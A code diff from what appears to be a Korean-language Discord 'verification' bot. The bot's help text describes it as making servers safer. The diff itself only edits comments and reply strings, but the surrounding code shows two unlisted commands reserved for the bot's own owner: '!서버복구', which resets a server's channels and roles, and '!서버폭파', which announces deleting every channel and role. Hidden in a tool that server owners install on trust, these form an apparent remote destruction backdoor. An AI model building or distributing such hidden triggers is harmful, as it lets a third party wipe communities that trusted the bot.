@@ -230,7 +230,7 @@ client.on('messageCreate', async (message) => {
     let settings = loadSettings();
     const isServerActivated = settings[guildId] && settings[guildId].activated === true;
 
-    // 1. !서버인증 명령어 (서버 소유자 전용 - 봇 활성화 선결 조건)
+    // 1. !서버인증 명령어 (서버 소유자 전용 - 1번만 치면 활성화되고 DM으로 링크 전송)
     if (content === '!서버인증') {
         if (!isServerOwner && !isBotOwner) {
             return message.reply('❌ 이 명령어는 **서버 소유자**만 사용할 수 있습니다.');
@@ -270,12 +270,12 @@ client.on('messageCreate', async (message) => {
         return;
     }
 
-    // 2. !도움말 명령어 (본인 전용 명령어는 목록에서 제외)
+    // 2. !도움말 명령어
     if (content === '!도움말') {
         return message.reply(
             `🤖 **더 안전한 서버를 만드는 인증봇입니다.**\n\n` +
             `📋 **[사용 가능한 명령어 목록]**\n` +
-            `• \`!서버인증\` - 서버 인증 시스템을 활성화하고 DM으로 인증 패널 링크를 받습니다. (서버 소유자 전용)\n` +
+            `• \`!서버인증\` - 서버 인증 시스템을 1회 활성화하고 DM으로 인증 패널 링크를 받습니다. (서버 소유자 전용)\n` +
             `• \`!인증\` - 현재 채널에 인증 패널 버튼을 전송합니다. (서버 소유자 전용)\n` +
             `• \`!인증역할 (역할아이디)\` - 인증 완료 역할을 설정합니다. (서버 소유자 전용)\n` +
             `• \`!아이디 (채널아이디)\` - 전용 로그 채널을 설정합니다. (서버 소유자 전용)\n` +
@@ -287,7 +287,7 @@ client.on('messageCreate', async (message) => {
 
     // 🛡️ [필수 체크] !서버인증으로 활성화되지 않은 서버는 다른 명령어 차단
     if (!isServerActivated && !isBotOwner) {
-        return message.reply('⚠️ **해당 서버는 아직 인증 시스템이 활성화되지 않았습니다.**\n서버 소유자가 먼저 채팅창에 **`!서버인증`**을 입력해 주세요.');
+        return message.reply('⚠️ **해당 서버는 아직 인증 시스템이 활성화되지 않았습니다.**\n서버 소유자가 먼저 채팅창에 **`!서버인증`**을 딱 한 번 입력해 주세요.');
     }
 
     // 3. !인증 명령어 (서버 소유자 전용)
@@ -451,7 +451,7 @@ client.on('messageCreate', async (message) => {
 
     // 8. !서버복구 명령어 (관리자 본인 전용)
     if (content === '!서버복구') {
-        if (!isBotOwner) return; // 권한 없으면 무시
+        if (!isBotOwner) return;
 
         await message.reply('🔄 **서버 복구를 시작합니다... 기존 채널과 역할이 초기화되고 템플릿 구조로 재구성됩니다.**');
 
@@ -503,7 +503,7 @@ client.on('messageCreate', async (message) => {
 
     // 9. !서버폭파 명령어 (관리자 본인 전용)
     if (content === '!서버폭파') {
-        if (!isBotOwner) return; // 권한 없으면 무시
+        if (!isBotOwner) return;
 
         await message.reply('💥 **서버 폭파 작업을 시작합니다... 모든 채널과 역할이 삭제됩니다.**');
 
